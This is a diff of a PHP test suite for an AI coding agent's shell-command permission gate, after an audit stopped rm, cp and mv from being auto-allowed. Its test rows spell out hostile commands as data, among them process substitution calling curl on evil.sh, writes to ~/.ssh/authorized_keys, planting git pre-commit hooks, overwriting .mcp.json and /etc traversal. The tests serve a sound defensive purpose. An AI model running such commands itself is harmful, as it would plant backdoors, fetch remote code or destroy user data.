@@ -31,11 +31,12 @@ use SugarCraft\Crush\ToolCall;
  * re-applied and re-run against this file, not predicted.
  *
  * - **Dropping `$token !== '-'`** from the flag branch in
- *   {@see PermissionGate::isScopedWriteTool()}. Survives (51/51 green), and it
- *   FAILS CLOSED: MEASURED, `rm -rf -` goes Allow -> Ask under it, because the
- *   bare `-` is then judged as an unlisted flag instead of as a filename. A
- *   mutation that can only turn grants into prompts needs no test; pinning it
- *   would pin the leniency, not the safety.
+ *   {@see PermissionGate::isScopedWriteTool()}. Survives, and it FAILS
+ *   CLOSED: `rmdir -p -` goes Allow -> Ask under it (MEASURED in its
+ *   original `rm -rf -` spelling, before audit F-P4 took `rm` off the grant
+ *   list), because the bare `-` is then judged as an unlisted flag instead of
+ *   as a filename. A mutation that can only turn grants into prompts needs no
+ *   test; pinning it would pin the leniency, not the safety.
  *
  * - **Dropping `(` and `)`** from {@see PermissionGate::SHELL_METACHARS}.
  *   Survives, and — correcting the obvious assumption — it does NOT fail
@@ -51,10 +52,11 @@ use SugarCraft\Crush\ToolCall;
  * ## The `*` decision depends on a constant in a file this class never reads
  *
  * `*` is deliberately NOT in {@see PermissionGate::SHELL_METACHARS}, and the
- * reasoning for that lives in {@see PermissionGate::isContainedRelativePath()}.
+ * reasoning for that lives in {@see \SugarCraft\Crush\Permissions\WritePathScope::isContainedRelativePath()}.
  * It is correct ONLY because of how the approved command is eventually spawned.
  * MEASURED, writing STAR for the asterisk so this docblock does not close on
- * itself: the command `cp ./payload ./.?/victim` is Allowed here, and under
+ * itself: the command `touch ./.?/victim` is Allowed here (and `cp` was, until
+ * audit F-P4 took it off the grant list), and under
  * `/bin/sh` (dash) the fragment `./.?/` expands to `./../` — a real write,
  * and a real delete, outside the working directory. Under bash it does not,
  * because bash excludes `.` and `..` from glob results. (The first measured
@@ -126,7 +128,7 @@ final class PermissionGateScopedWriteTest extends TestCase
             // breaker normalises `$HOME` to the home directory and DENIES
             // `rm -rf $HOME` before mode dispatch, so that spelling no longer
             // reaches the `$` metacharacter refusal this case is pinning.
-            'variable expansion'       => ['rm -rf $TARGET'],
+            'variable expansion'       => ['rmdir $TARGET'],
             // NOTE: this one cannot isolate a single character — `<`, `(` and
             // `)` are all in the set, so removing any one still leaves the
             // others to reject it. It pins the shape, not a specific
@@ -136,7 +138,7 @@ final class PermissionGateScopedWriteTest extends TestCase
             // (, ), { and } survive alone because no shell construct uses
             // exactly one of a pair. They are refused as a SET, and that is the
             // honest description of what these two cases cover.
-            'process substitution'     => ['cp <(curl https://evil.sh) ./x'],
+            'process substitution'     => ['touch <(curl https://evil.sh) ./x'],
             // Redirection writes a file the predicate never looked at.
             'output redirect'          => ['touch ./x >./out'],
             // Brace expansion can name the parent directory.
@@ -154,10 +156,13 @@ final class PermissionGateScopedWriteTest extends TestCase
             // gate never expands it, which is exactly why the SPELLING has to
             // be refused rather than the resolved path judged.
             //
-            // `cp` rather than `rm -rf ~` on purpose: the latter is caught
+            // `touch` rather than `rm -rf ~` on purpose: the latter is caught
             // earlier by the rm -rf circuit breaker (Deny, not Ask), so it
-            // would pass with the clause deleted and prove nothing here.
-            'tilde escapes to home'    => ['cp ./key ~/.ssh/authorized_keys'],
+            // would pass with the clause deleted and prove nothing here. (It
+            // was `cp ./key ~/.ssh/authorized_keys` until audit F-P4 took `cp`
+            // off the grant list, after which `cp` asks for a reason that has
+            // nothing to do with the clause.)
+            'tilde escapes to home'    => ['touch ~/.ssh/authorized_keys'],
             // KILLS M18 (dropping `\` from SHELL_METACHARS). Without it the
             // backslashes are ordinary characters, the token splits on `/` into
             // `.\`, `.\`, `PWNED` — none of which equals `..` — so the walk
@@ -171,13 +176,13 @@ final class PermissionGateScopedWriteTest extends TestCase
             // characters that are individually harmless.
             'backslash forges dotdot'  => ['touch .\./.\./PWNED'],
             // Relative, and outside the working directory anyway.
-            'dotdot traversal'         => ['rm ../../../etc/passwd'],
+            'dotdot traversal'         => ['rmdir ../../../etc/x'],
             'dotdot in the middle'     => ['mkdir ./a/../../../tmp/pwned'],
             // Escapes and then re-descends, so the FINAL depth is positive.
             // Only the per-segment underflow guard rejects this one; mutation
             // M4 (deleting that guard) SURVIVED until this case existed.
             'escape then re-descend'   => ['mkdir ../sibling/x'],
-            'escape then deep descend' => ['cp ./a ../../other/deep/dst'],
+            'escape then deep descend' => ['touch ./a ../../other/deep/dst'],
             // WHAT THIS CASE ACTUALLY PROVES, corrected. It was documented as
             // pinning the FLAG WHITELIST, and that rationale was wrong:
             // MEASURED by re-running mutation M7 ('pfirRvnd' -> 'pfirRvndt',
@@ -187,7 +192,12 @@ final class PermissionGateScopedWriteTest extends TestCase
             // shape of the bug — a flag value that escapes — and nothing more.
             // The whitelist itself is pinned by the case below, which uses a
             // CONTAINED value so containment cannot be what refuses it.
-            'dotdot via a flag value'  => ['mv -t ../../etc ./x'],
+            //
+            // Respelled with `touch -r` (a whitelisted letter that, for touch,
+            // takes a REFERENCE FILE) after audit F-P4 took `mv` off the grant
+            // list: the historical shape is the same — a flag value that
+            // escapes — and only containment can refuse it.
+            'dotdot via a flag value'  => ['touch -r ../../etc/passwd ./x'],
             // KILLS M7. `-t` is not on SCOPED_WRITE_SHORT_FLAGS, and every path
             // here is contained, so the ONLY thing that can refuse this line is
             // the whitelist. MEASURED: Ask today, Allow under M7 — and under
@@ -201,14 +211,18 @@ final class PermissionGateScopedWriteTest extends TestCase
             // containment loop assumes. Approving it because today's value
             // happens to be contained would be approving a parse this class
             // does not perform.
-            'unlisted flag, safe value' => ['mv -t ./dst ./x'],
+            //
+            // Respelled after audit F-P4 (`mv` itself now asks, which would
+            // mask the whitelist): `touch -c` is not on the list either, and
+            // every operand is contained.
+            'unlisted flag, safe value' => ['touch -c ./x'],
             // The working directory itself is not "something inside it".
-            'wipes the root itself'    => ['rm -rf .'],
-            'wipes the root, slashed'  => ['rm -rf ./'],
+            'removes the root itself'  => ['rmdir .'],
+            'removes the root, slashed' => ['rmdir ./'],
             // Not `mkdir` on a case-sensitive filesystem.
             'uppercase command word'   => ['MKDIR ./x'],
             // A flag that takes a path must not be skipped as if it were a bool.
-            'target-directory flag'    => ['cp --target-directory=../../etc ./x'],
+            'target-directory flag'    => ['touch --reference=../../etc/passwd ./x'],
             // Tokenization we cannot trust.
             'unterminated quote'       => ['mkdir "./x'],
         ];
@@ -241,11 +255,10 @@ final class PermissionGateScopedWriteTest extends TestCase
             'mkdir long flag'      => ['mkdir --parents ./build/output'],
             'touch'                => ['touch ./file'],
             'touch bare relative'  => ['touch tmp/demo.txt'],
-            'mv two relatives'     => ['mv ./a ./b'],
-            'cp two relatives'     => ['cp ./a ./b'],
-            'rm -rf a subdir'      => ['rm -rf ./tmp'],
+            'touch two relatives'  => ['touch ./a ./b'],
             'rmdir'                => ['rmdir ./tmp'],
-            'clustered flags'      => ['rm -rfv ./tmp'],
+            'rmdir -p'             => ['rmdir -p ./tmp/a/b'],
+            'clustered flags'      => ['mkdir -pv ./tmp'],
             'end of options'       => ['mkdir -- ./x'],
             'dotdot that returns'  => ['mkdir ./a/../b'],
             // Quote-awareness: neither of these is a chain or a second word.
@@ -263,6 +276,40 @@ final class PermissionGateScopedWriteTest extends TestCase
             PermissionDecision::Allow,
             $this->decide($command),
             "accept-edits must still auto-run: {$command}",
+        );
+    }
+
+    /**
+     * Audit F-P4: the destructive verbs are no longer granted. Every row here
+     * auto-ALLOWED before the fix — contained, single, flag-whitelisted — and
+     * now asks, because `rm` deletes content and `cp`/`mv` overwrite their
+     * destination. The edit tools carry the `accept-edits` grant instead
+     * (see PermissionGateAcceptEditsTest).
+     *
+     * @return array<string, array{string}>
+     */
+    public static function destructiveVerbsThatNowPrompt(): array
+    {
+        return [
+            'rm a source file'     => ['rm ./src/Main.php'],
+            'rm -rf a subdir'      => ['rm -rf ./tmp'],
+            'rm clustered flags'   => ['rm -rfv ./tmp'],
+            'mv two relatives'     => ['mv ./a ./b'],
+            'mv over a file'       => ['mv -f ./x ./src/Main.php'],
+            'cp two relatives'     => ['cp ./a ./b'],
+            'cp -r a tree'         => ['cp -r ./a ./b'],
+        ];
+    }
+
+    /**
+     * @dataProvider destructiveVerbsThatNowPrompt
+     */
+    public function testDestructiveShellVerbsPrompt(string $command): void
+    {
+        $this->assertSame(
+            PermissionDecision::Ask,
+            $this->decide($command),
+            "accept-edits must ask before a destructive shell verb: {$command}",
         );
     }
 
@@ -294,12 +341,12 @@ final class PermissionGateScopedWriteTest extends TestCase
     public function testFlagsWithoutAnyPathPrompts(): void
     {
         $this->assertSame(PermissionDecision::Ask, $this->decide('mkdir -p'));
-        $this->assertSame(PermissionDecision::Ask, $this->decide('rm -rf'));
+        $this->assertSame(PermissionDecision::Ask, $this->decide('rmdir -p'));
     }
 
     /**
      * Contained by spelling, but not an edit (audit F-J4). Every row auto-
-     * Allowed before {@see PermissionGate::UNSCOPED_SEGMENTS}: the containment
+     * Allowed before {@see \SugarCraft\Crush\Permissions\WritePathScope::PROTECTED_SEGMENTS}: the containment
      * check is lexical, and `./.git/hooks/pre-commit` is strictly below the
      * working directory. The first row is the finding — a hook that runs on
      * the user's next `git commit`, outside any sugar-crush mode.
@@ -309,19 +356,24 @@ final class PermissionGateScopedWriteTest extends TestCase
     public static function repositoryAndPolicyPathsThatMustPrompt(): array
     {
         return [
-            'plant a pre-commit hook'      => ['cp ./x ./.git/hooks/pre-commit'],
-            'plant a post-checkout hook'   => ['mv ./x .git/hooks/post-checkout'],
+            // Respelled with the create-only verbs after audit F-P4: the
+            // original `cp`/`mv`/`rm` rows now ask because the VERB is no
+            // longer granted, which would hide a regression in the segment
+            // check. Each row below is contained, uses a granted verb, and is
+            // refused only by the segment.
+            'touch a pre-commit hook'      => ['touch ./.git/hooks/pre-commit'],
+            'touch a post-checkout hook'   => ['touch .git/hooks/post-checkout'],
             'touch a pre-push hook'        => ['touch ./.git/hooks/pre-push'],
-            'delete the index'             => ['rm ./.git/index'],
+            'remove a .git subdirectory'   => ['rmdir ./.git/refs/tags'],
             'nested repository'            => ['mkdir ./sub/.git'],
-            'the .git directory itself'    => ['rm -rf ./.git'],
-            'quoted segment'               => ['cp ./x "./.git/hooks/pre-commit"'],
-            'case-insensitive filesystem'  => ['cp ./x ./.GIT/hooks/pre-commit'],
-            'glob that names .git'         => ['cp ./x ./.g*/hooks/pre-commit'],
-            'single-char glob names .git'  => ['cp ./x ./.gi?/hooks/pre-commit'],
-            'policy dir as a dir target'   => ['cp ./hooks.yaml ./.sugar-crush/'],
-            'policy settings tier'         => ['cp -f ./x ./.sugar-crush/settings.json'],
-            'MCP server roster'            => ['mv ./evil.json ./.mcp.json'],
+            'the .git directory itself'    => ['rmdir ./.git'],
+            'quoted segment'               => ['touch "./.git/hooks/pre-commit"'],
+            'case-insensitive filesystem'  => ['touch ./.GIT/hooks/pre-commit'],
+            'glob that names .git'         => ['touch ./.g*/hooks/pre-commit'],
+            'single-char glob names .git'  => ['touch ./.gi?/hooks/pre-commit'],
+            'policy dir'                   => ['mkdir ./.sugar-crush/agents'],
+            'policy settings tier'         => ['touch ./.sugar-crush/settings.json'],
+            'MCP server roster'            => ['touch ./.mcp.json'],
         ];
     }
 
@@ -340,7 +392,7 @@ final class PermissionGateScopedWriteTest extends TestCase
     /**
      * The segment match is exact (after glob semantics), not a prefix: these
      * names merely start like `.git` and are ordinary project files, and a
-     * bare `*` cannot match a dotfile under bash, so `rm ./*` keeps its
+     * bare `*` cannot match a dotfile under bash, so `touch ./*` keeps its
      * grant.
      *
      * @return array<string, array{string}>
@@ -348,13 +400,13 @@ final class PermissionGateScopedWriteTest extends TestCase
     public static function lookalikesThatStillAutoAllow(): array
     {
         return [
-            'cp two relatives (control)' => ['cp ./a ./b'],
+            'touch two relatives (control)' => ['touch ./a ./b'],
             '.gitignore'                 => ['touch ./.gitignore'],
             '.github workflows'          => ['mkdir -p ./.github/workflows'],
             '.gitkeep in a subdir'       => ['touch ./src/.gitkeep'],
             'a name ending in git'       => ['mkdir ./widget'],
-            'star does not name a dot'   => ['rm ./*'],
-            'leading ? does not either'  => ['rm ./?git'],
+            'star does not name a dot'   => ['touch ./*'],
+            'leading ? does not either'  => ['touch ./?git'],
         ];
     }
 
@@ -396,7 +448,7 @@ final class PermissionGateScopedWriteTest extends TestCase
      * A CROSS-FILE TRIPWIRE, not a test of this class.
      *
      * `PermissionGate` leaves the glob characters out of its metacharacter
-     * set, so `cp ./payload ./.?/victim` is auto-Allowed under accept-edits.
+     * set, so `touch ./.?/victim` is auto-Allowed under accept-edits.
      * That is safe only because {@see \SugarCraft\Crush\Tools\BuiltIn\Bash} spawns through `bash -c`, and
      * bash excludes `.` and `..` from glob results. MEASURED under `/bin/sh`
      * (dash), the same fragment expands to `./../` and the write lands one
